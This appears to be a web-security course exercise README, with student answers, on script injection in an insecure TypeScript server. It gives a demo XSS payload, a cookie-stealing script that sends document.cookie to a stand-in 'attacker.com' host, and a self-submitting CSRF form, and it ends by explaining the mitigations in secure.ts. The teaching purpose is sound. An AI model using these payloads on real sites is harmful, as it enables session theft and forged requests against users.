# Tampering

This example demonstrates tampering through script injection.

## Steps to reproduce

1. Install all dependencies

    `npm install`

2. Start the **insecure.ts** server

    `npx ts-node insecure.ts`

3. In the browser, type a potentially malicious script in the name field of the form

    ```
        <script> document.body.innerHTML = "<a href='https://google.com'> Gotcha </a>"</script>
    ```

4. Do you see the potentially malicious hyperlink being injected into the form?

## For you to do

Answer the following:

1. Briefly explain the potential vulnerabilities in **insecure.ts**
The potential vulnerabilities are:
(1) XSS vulnerability due to no input sanitization in the name field.
(2) Session cookie is vulnerable since httpOnly is set to false
(3) Hardcoded session secret ("SOMESECRET") instead of using a dynamic secret
2. Briefly explain how a malicious attacker can exploit them.
XSS Attack through name field: const maliciousName = `<script>fetch('https://attacker.com/steal?cookie=' + document.cookie)</script>`;
CSRF Attack from malicious site:
<form id="evil" action="http://victim-site:8000/register" method="POST">
    <input name="name" value="Admin">
</form>
<script>document.getElementById('evil').submit();</script>
3. Briefly explain why **secure.ts** does not have the same vulnerabilties?
it does not have the same vulnerabilities because it implements escapeHTML() function to sanitize user input, httpOnly is set to true, sets sameSite: 'strict', and uses command-line argument for session secret instead of hardcoding it.